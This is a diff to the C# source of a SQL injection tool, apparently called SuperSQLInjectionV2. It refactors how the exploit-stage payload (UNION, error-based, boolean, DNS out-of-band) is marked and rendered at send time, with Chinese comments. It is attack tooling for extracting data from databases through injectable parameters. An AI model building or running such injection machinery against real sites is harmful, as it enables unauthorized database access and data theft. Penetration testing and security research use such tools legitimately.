@@ -898,7 +898,7 @@ namespace SuperSQLInjectionV2.Tools.Inject
             inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
             inp.Prefix = prefix; inp.Suffix = suffix;
             inp.Clause = string.Join(",", boundary.Clause);
-            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
+            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix, inp.DBType, where, inp.VectorTemplate);
             inp.RequestTxt = BuildRequest(ctx, inp.PValue);
             inp.PName = ctx.PName;
             inp.Place = ctx.Place;
@@ -926,7 +926,7 @@ namespace SuperSQLInjectionV2.Tools.Inject
                     {
                         ctx.DbCandidates.Add(fpDb);
                     }
-                    inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
+                    inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix, inp.DBType, where, inp.VectorTemplate);
                     inp.RequestTxt = BuildRequest(ctx, inp.PValue);
                     Log.Success("布尔指纹库识别：后端数据库可能为 " + fpDb + "（方言探针双验证通过）！");
                 }
@@ -1333,18 +1333,15 @@ namespace SuperSQLInjectionV2.Tools.Inject
             inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
             inp.Prefix = prefix; inp.Suffix = suffix;
             inp.Clause = string.Join(",", boundary.Clause);
-            //报错vector复用：烘焙前预生成取数回显标记并随注入点携带（BuildInjectRecord优先复用），
-            //vector分隔符按 起始+分隔/分隔+结束 组合烘焙——vector分隔符本身就是提取标记，
+            //报错vector复用：预生成取数回显标记随注入点携带（BuildInjectRecord优先复用），
+            //发送期RenderVectorForSend把vector分隔符按 起始+分隔/分隔+结束 组合渲染——vector分隔符本身就是提取标记，
             //取数[QUERY]槽位塞裸表达式，消除vector分隔符+ConcatData双重标记开销（报错回显容量仅~31字符）
-            string? emStart = null, emStop = null;
             if (!string.IsNullOrEmpty(inp.VectorTemplate) && inp.VectorTemplate.Contains("[QUERY]", StringComparison.Ordinal))
             {
                 (inp.StartMark, inp.EndMark, inp.SplitMark) = Payload.EchoMarkers.Generate();
-                emStart = inp.StartMark + inp.SplitMark;
-                emStop = inp.SplitMark + inp.EndMark;
             }
             inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix, inp.DBType,
-                where, inp.VectorTemplate, ph, true, emStart, emStop);
+                where, inp.VectorTemplate, true);
             inp.RequestTxt = BuildRequest(ctx, inp.PValue);
             inp.PName = ctx.PName;
             inp.Place = ctx.Place;
@@ -1544,7 +1541,7 @@ namespace SuperSQLInjectionV2.Tools.Inject
             inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
             inp.Prefix = prefix; inp.Suffix = suffix;
             inp.Clause = string.Join(",", boundary.Clause);
-            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, " UNION ALL SELECT "), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
+            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, " UNION ALL SELECT "), prefix, suffix, inp.DBType, where, inp.VectorTemplate);
             inp.RequestTxt = BuildRequest(ctx, inp.PValue);
             inp.PName = ctx.PName;
             inp.Place = ctx.Place;
@@ -1833,7 +1830,7 @@ namespace SuperSQLInjectionV2.Tools.Inject
             inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
             inp.Prefix = prefix; inp.Suffix = suffix;
             inp.Clause = string.Join(",", boundary.Clause);
-            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
+            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix, inp.DBType, where, inp.VectorTemplate);
             inp.RequestTxt = BuildRequest(ctx, inp.PValue);
             inp.PName = ctx.PName;
             inp.Place = ctx.Place;
@@ -1939,7 +1936,6 @@ namespace SuperSQLInjectionV2.Tools.Inject
             var hit = pending.First(p => hitTokens.Contains(p.token));
             Log.Warning("发现DNS外带注入！用例：" + hit.test.Title + "，token=" + hit.token + " 已在DNSLog平台回收到解析记录");
             InjectPayloadManager.RecordHit(hit.test);
-            PayloadPlaceholder eph = new PayloadPlaceholder();
             InjectPoint inp = new InjectPoint();
             inp.IsInject = true;
             inp.InjectType = InjectType.Dns;
@@ -1954,7 +1950,7 @@ namespace SuperSQLInjectionV2.Tools.Inject
             inp.UnionStartPayLoad = hit.where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : hit.prefix + " and ";
             inp.Prefix = hit.prefix; inp.Suffix = hit.suffix;
             inp.Clause = hit.clause;
-            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, hit.where, hit.payload), hit.prefix, hit.suffix, inp.DBType, hit.where, inp.VectorTemplate, eph);
+            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, hit.where, hit.payload), hit.prefix, hit.suffix, inp.DBType, hit.where, inp.VectorTemplate);
             inp.RequestTxt = BuildRequest(ctx, inp.PValue);
             inp.PName = ctx.PName;
             inp.Place = ctx.Place;
@@ -2237,39 +2233,31 @@ namespace SuperSQLInjectionV2.Tools.Inject
         /// 利用阶段标记：统一使用 and 胶水与后续取数payload衔接（取数payload如"1=2 union all select ..."不带前导关键字），
         /// 按数据库追加注释收尾；无注释时将boundary后缀保留在编码段内保证括号配平。
         /// 前缀同样在Encode块内（可能含空格，见MarkedValue说明）。
-        /// where=3（参数整体替换）或报错技术（errorTechnique=true）时按用例语义改用检出用例的vector模板：
-        /// prefixQuery/suffixQuery对WHERE.REPLACE均跳过boundary前后缀，取数条件/数据表达式直接进vector的[INFERENCE]/[QUERY]槽位，
-        /// 仅按库追加注释；报错技术where=1/2同样原文复用vector（baseValue+prefix+vector+注释+suffix），
-        /// 保证取数触发函数/包装结构与检测命中payload完全一致（sqlmap vector存档复用同款）。
+        /// vector模式（where=3参数替换 或 报错技术检出[QUERY]vector）不再把vector烘进标记报文：
+        /// 标记只保留简单胶水（$sql$槽位，vector自带AND/OR关键字不需要and），vector模板存注入记录VectorTemplate字段，
+        /// 发送期由StringReplace经RenderVectorForSend装配——报文可读、人工可标记配置，
+        /// 分隔符按发送时当前回显标记渲染（标记期烘焙的hex分隔符在EchoMarkers变化后会失配，发送期渲染永不失配）。
         /// </summary>
         private static string ExploitMarkedValue(Ctx ctx, string pvalue, string prefix, string suffix, DBType db,
-            int where = 1, string vectorTemplate = "", PayloadPlaceholder? ph = null, bool errorTechnique = false,
-            string? exploitRawStart = null, string? exploitRawStop = null)
+            int where = 1, string vectorTemplate = "", bool errorTechnique = false)
         {
-            string? bakedVector = null;
-            if ((where == 3 || errorTechnique) && !string.IsNullOrWhiteSpace(vectorTemplate))
-            {
-                string? baked = BakeVector(ctx, ph, vectorTemplate, db, exploitRawStart, exploitRawStop);
-                if (!string.IsNullOrEmpty(baked))
-                {
-                    bakedVector = baked;
-                }
-            }
-            //where!=3且vector无取数槽位时走and胶水路径（bakedVector=null）；
-            //报错技术where=1/2的vector保留boundary前后缀（keepGlueAffixes）
-            string marked = BakeExploitMarkedValue(pvalue, prefix, suffix, db, bakedVector, where != 3);
+            //where!=3且vector无取数槽位时走and胶水路径；报错技术where=1/2保留boundary前后缀（keepGlueAffixes）
+            bool vectorDefer = (where == 3 || errorTechnique) && HasVectorSlot(vectorTemplate);
+            string marked = BakeExploitMarkedValue(pvalue, prefix, suffix, db, vectorDefer, where != 3);
             return ctx.Base64 ? WrapBase64MarkedValue(marked) : marked;
         }
 
         /// <summary>
         /// 利用标记烘焙（与检测期ExploitMarkedValue同一语义，供恢复注入记录时按结构化字段重烘焙）：
-        /// 基底值 + Encode块（前缀+and $sql$+注释+后缀，或已渲染vector+注释）。
-        /// keepGlueAffixes：报错技术where=1/2的vector复用场景置真——vector替换的是"and $sql$"段，
-        /// boundary前后缀仍需保留（检测期装配为 baseValue+prefix+vector+注释+suffix）；
+        /// 基底值 + Encode块（前缀+and $sql$+注释+后缀）。
+        /// vectorDefer（报错[QUERY]/where=3[INFERENCE]的vector原文复用场景置真）：vector不烘进标记，
+        /// 标记只留$sql$槽位（vector自带AND/OR等关键字，无需and胶水），发送期按VectorTemplate渲染装配；
+        /// keepGlueAffixes（报错where=1/2）：前缀走FixPrefix规整（不以空格/(结尾补空格），
+        /// 与检测期MarkedValue装配完全一致，避免 baseValue+vector 粘连（如 id=1AND ...）；
         /// where=3参数替换语义保持跳过前后缀（sqlmap prefixQuery/suffixQuery对WHERE.REPLACE同款）。
         /// 编码策略统一Encode块，发送期按块位置推断是否URL编码（见StringReplace.IsRawPosition）。
         /// </summary>
-        public static string BakeExploitMarkedValue(string baseValue, string prefix, string suffix, DBType db, string? bakedVectorOrNull, bool keepGlueAffixes = false)
+        public static string BakeExploitMarkedValue(string baseValue, string prefix, string suffix, DBType db, bool vectorDefer, bool keepGlueAffixes = false)
         {
             string comment = db switch
             {
@@ -2279,14 +2267,12 @@ namespace SuperSQLInjectionV2.Tools.Inject
                 _ => "-- "
             };
             string inner;
-            if (bakedVectorOrNull != null)
+            if (vectorDefer)
             {
                 string tail = string.IsNullOrEmpty(comment) ? (suffix ?? "") : (comment + (suffix ?? ""));
-                //keepGlueAffixes（报错where=1/2）：前缀走FixPrefix规整（不以空格/(结尾补空格），
-                //与检测期MarkedValue装配完全一致，避免 baseValue+vector 粘连（如 id=1AND ...）
                 inner = keepGlueAffixes
-                    ? FixPrefix(prefix) + bakedVectorOrNull + tail
-                    : bakedVectorOrNull + comment;
+                    ? FixPrefix(prefix) + ConstData.InjectStr + tail
+                    : ConstData.InjectStr + comment;
             }
             else
             {
@@ -2297,62 +2283,39 @@ namespace SuperSQLInjectionV2.Tools.Inject
         }
 
         /// <summary>
-        /// 恢复期vector烘焙（无检测上下文）：[INFERENCE]/[QUERY]替换为$sql$，其余占位符用全新随机占位符渲染，
-        /// [ORIGVALUE]用记录的原参数值。模板无取数槽位时返回null（调用方回退and胶水路径）。
+        /// 发送期vector装配（IsVectorMode取数，由StringReplace在$sql$替换前调用）：
+        /// [INFERENCE]（布尔/时间条件槽）与[QUERY]（报错数据槽）替换为本次发送payload，
+        /// 其余占位符（[RANDNUM]/[DELIMITER_START]等）随机渲染，[ORIGVALUE]用记录原参数值，
+        /// [SLEEPTIME]按sleepTime（调用方传当前判断值秒数，时间vector的延时须与oracle阈值一致）。
+        /// [QUERY]报错槽位分隔符对齐当前回显标记组合（EchoMarkers.Start+Split / Split+End）——
+        /// 分隔符本身就是提取标记，取数塞裸表达式、解析走EchoMarkers正则，不叠ConcatData第二层标记
+        /// （报错回显容量仅~31字符，双重标记会吃光容量）。模板无取数槽位时原样返回payload。
         /// </summary>
-        public static string? BakeVectorForRestore(string? vectorTemplate, string? origValue, DBType db = DBType.UnKnow)
+        public static string RenderVectorForSend(string? vectorTemplate, string payload, string? origValue, DBType db, int sleepTime = 1)
         {
             string v = vectorTemplate ?? "";
             if (!HasVectorSlot(v))
             {
-                return null;
+                return payload;
             }
             bool isQuerySlot = v.Contains("[QUERY]", StringComparison.Ordinal);
-            v = v.Replace("[INFERENCE]", ConstData.InjectStr, StringComparison.Ordinal).Replace("[QUERY]", ConstData.InjectStr, StringComparison.Ordinal);
-            //分隔符按记录库型编码渲染（与检测期RepSql同语义），恢复取数时反射页同样无法伪造标记。
-            //[QUERY]报错槽位：分隔符对齐为当前回显标记组合（EchoMarkers.Start+Split / Split+End），
-            //取数时[QUERY]位塞裸表达式、解析走EchoMarkers正则——调用方须先EchoMarkers.Use(record)再调本方法
+            v = v.Replace("[INFERENCE]", payload, StringComparison.Ordinal).Replace("[QUERY]", payload, StringComparison.Ordinal);
             if (isQuerySlot)
             {
-                return new PayloadPlaceholder().ReplaceSql(v, DelimiterEncoderFor(db),
+                return new PayloadPlaceholder(sleepTime).ReplaceSql(v, DelimiterEncoderFor(db),
                     Payload.EchoMarkers.Start + Payload.EchoMarkers.Split,
                     Payload.EchoMarkers.Split + Payload.EchoMarkers.End)
                     .Replace("[ORIGVALUE]", origValue ?? "", StringComparison.Ordinal);
             }
-            return new PayloadPlaceholder().ReplaceSql(v, DelimiterEncoderFor(db)).Replace("[ORIGVALUE]", origValue ?? "", StringComparison.Ordinal);
+            return new PayloadPlaceholder(sleepTime).ReplaceSql(v, DelimiterEncoderFor(db))
+                .Replace("[ORIGVALUE]", origValue ?? "", StringComparison.Ordinal);
         }
 
         /// <summary>vector模板是否含取数槽位（[INFERENCE]条件槽/[QUERY]报错数据槽）</summary>
-        private static bool HasVectorSlot(string vectorTemplate)
+        public static bool HasVectorSlot(string? vectorTemplate)
         {
             return !string.IsNullOrWhiteSpace(vectorTemplate)
                 && (vectorTemplate.Contains("[INFERENCE]", StringComparison.Ordinal) || vectorTemplate.Contains("[QUERY]", StringComparison.Ordinal));
-        }
-
-        /// <summary>
-        /// 烘焙where=3参数替换点的vector模板为利用标记：
-        /// [INFERENCE]（布尔/时间条件槽）与[QUERY]（报错数据表达式槽）统一替换为发送期标记$sql$，
-        /// 其余占位符（[RANDNUM]/[SLEEPTIME]/[DELIMITER_START]/[ORIGVALUE]等）按检测时同一上下文渲染。
-        /// exploitRawStart/exploitRawStop非空时（报错vector复用）：分隔符对齐为取数回显标记组合，
-        /// [QUERY]槽位取数塞裸表达式，消除vector分隔符+ConcatData双重标记开销。
-        /// 模板无取数槽位时返回空串（调用方回退and胶水路径）。
-        /// </summary>
-        private static string? BakeVector(Ctx ctx, PayloadPlaceholder? ph, string? vectorTemplate, DBType db,
-            string? exploitRawStart = null, string? exploitRawStop = null)
-        {
-            string v = vectorTemplate ?? "";
-            if (!v.Contains("[INFERENCE]", StringComparison.Ordinal) && !v.Contains("[QUERY]", StringComparison.Ordinal))
-            {
-                return "";
-            }
-            v = v.Replace("[INFERENCE]", ConstData.InjectStr, StringComparison.Ordinal).Replace("[QUERY]", ConstData.InjectStr, StringComparison.Ordinal);
-            PayloadPlaceholder placeholder = ph ?? new PayloadPlaceholder();
-            if (exploitRawStart != null)
-            {
-                return placeholder.ReplaceSql(v, DelimiterEncoderFor(db), exploitRawStart, exploitRawStop)
-                    .Replace("[ORIGVALUE]", ctx.PValue ?? "", StringComparison.Ordinal);
-            }
-            return RepSql(ctx, placeholder, v, db);
         }
 
         /// <summary>
